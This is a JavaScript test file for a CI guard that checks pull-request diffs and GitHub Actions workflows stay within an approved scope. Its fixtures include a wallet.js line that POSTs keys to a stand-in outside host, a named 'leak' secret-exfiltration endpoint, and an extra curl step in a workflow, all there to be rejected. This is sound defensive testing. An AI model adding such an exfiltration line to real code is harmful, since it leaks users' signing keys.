import assert from 'node:assert/strict';
import {mkdtempSync,mkdirSync,rmSync,writeFileSync} from 'node:fs';
import {tmpdir} from 'node:os';
import {dirname,join} from 'node:path';
import {execFileSync} from 'node:child_process';
import {reviewDiff,reviewWorkflow,verifyCandidateBoundary} from './candidate-boundary.mjs';
let n=0;
const test=(name,fn)=>{fn();n++;console.log('PASS '+name)};
const wf=[
'name: FAE LRP-001 Candidate Technical Claims Guard',
'on:',
'  pull_request:',
'    paths:',
"      - 'lab/legal-perimeter/**'",
"      - '.github/workflows/fae-lrp-001-candidate.yml'",
'permissions:',
'  contents: read',
'jobs:',
'  lrp-candidate:',
'    runs-on: ubuntu-latest',
'    timeout-minutes: 8',
'    steps:',
'      - uses: actions/checkout@v4',
'        with:',
'          fetch-depth: 0',
'          ref: $'+'{{ github.event.pull_request.head.sha }}',
'          persist-credentials: false',
'      - uses: actions/setup-node@v4',
'        with:',
"          node-version: '22'",
'      - name: Source-bound adversarial regressions',
'        run: node lab/legal-perimeter/release-gate.test.mjs',
'      - name: Exact-source candidate proposal',
'        run: node lab/legal-perimeter/release-gate.mjs lab/legal-perimeter/perimeter.json lab/legal-perimeter/proposal.example.json',
'      - name: Candidate boundary regressions',
'        run: node lab/legal-perimeter/candidate-boundary.test.mjs',
'      - name: Verify actual candidate diff and workflow boundary',
'        run: node lab/legal-perimeter/candidate-boundary.mjs',
'      - name: Bounded real-source wallet and hosted relay behavior',
'        run: node lab/legal-perimeter/source-to-runtime.test.mjs',
'      - name: Canonical deployed SQL atomicity risk witness',
'        run: node lab/legal-perimeter/sql-atomicity-witness.test.mjs'
].join('\n')+'\n';
const allowed='A\tlab/legal-perimeter/candidate-boundary.mjs\nM\t.github/workflows/fae-lrp-001-candidate.yml';
test('admissible isolated PR diff',()=>assert.deepEqual(reviewDiff(allowed).errors,[]));
test('disallow changed wallet while old local signing remains',()=>assert.match(reviewDiff(allowed+'\nM\twallet.js').errors.join('|'),/out-of-owner modification wallet.js/));
test('disallow new hosted secret-exfiltration endpoint',()=>assert.match(reviewDiff(allowed+'\nA\tsupabase/functions/leak/index.ts').errors.join('|'),/out-of-owner/));
test('disallow changes in other existing workflows',()=>assert.match(reviewDiff(allowed+'\nM\t.github/workflows/verify-canonical-source.yml').errors.join('|'),/out-of-owner/));
test('disallow deleted evidence and renames',()=>{assert.ok(reviewDiff('D\tlab/legal-perimeter/perimeter.json').errors.length);assert.ok(reviewDiff('R100\ta\tb').errors.length)});
test('disallow fabricated traversal or missing diff evidence',()=>{assert.ok(reviewDiff('A\tlab/legal-perimeter/../wallet.js').errors.length);assert.ok(reviewDiff('').errors.length)});
test('read-only exact-head PR workflow passes',()=>assert.deepEqual(reviewWorkflow(wf),[]));
test('scheduler and write privilege rejected',()=>{assert.ok(reviewWorkflow(wf.replace('on:\n','on:\n  schedule:\n')).length);assert.ok(reviewWorkflow(wf.replace('contents: read','contents: write')).length)});
test('extra shell command or action rejected',()=>{assert.ok(reviewWorkflow(wf+'      - run: curl https://example.test\n').length);assert.ok(reviewWorkflow(wf+'      - uses: external/step@main\n').length)});
test('mismatched checkout head or widened trigger rejected',()=>{assert.ok(reviewWorkflow(wf.replace('ref: $'+'{{ github.event.pull_request.head.sha }}','ref: main')).length);assert.ok(reviewWorkflow(wf.replace("'lab/legal-perimeter/**'","'**'")).length)});
const root=mkdtempSync(join(tmpdir(),'lrp001-real-git-'));
try{
  const git=(...args)=>execFileSync('git',['-C',root,...args],{encoding:'utf8'}).trim();
  const put=(path,data)=>{mkdirSync(dirname(join(root,path)),{recursive:true});writeFileSync(join(root,path),data)};
  git('init','-q');git('config','user.name','FAE LRP isolated fixture');git('config','user.email','lrp@example.invalid');
  put('.github/workflows/fae-lrp-001-candidate.yml',wf);
  put('wallet.js','function signLocally(){}\n');
  git('add','.');git('commit','-qm','test baseline');const baseline=git('rev-parse','HEAD');
  put('lab/legal-perimeter/perimeter.json','{}\n');
  git('add','.');git('commit','-qm','isolated candidate');
  test('REAL-GIT: parent and actual scoped delta accepted',()=>assert.deepEqual(verifyCandidateBoundary(root,{baseline,expectedBaseline:baseline}).errors,[]));
  put('wallet.js','function signLocally(){}\nfetch("https://outside.example/keys",{method:"POST"});\n');
  git('add','.');git('commit','-qm','unreviewed key transmission');
  test('REAL-GIT: additional exfiltration in wallet rejected',()=>assert.match(verifyCandidateBoundary(root,{baseline,expectedBaseline:baseline}).errors.join('|'),/out-of-owner modification wallet.js/));
  test('REAL-GIT: rebase evidence laundering rejected',()=>assert.match(verifyCandidateBoundary(root,{baseline:git('rev-parse','HEAD'),expectedBaseline:baseline}).errors.join('|'),/wrong or unverified reference/));
}finally{rmSync(root,{recursive:true,force:true})}
console.log(n+'/'+n+' candidate boundary tests passed');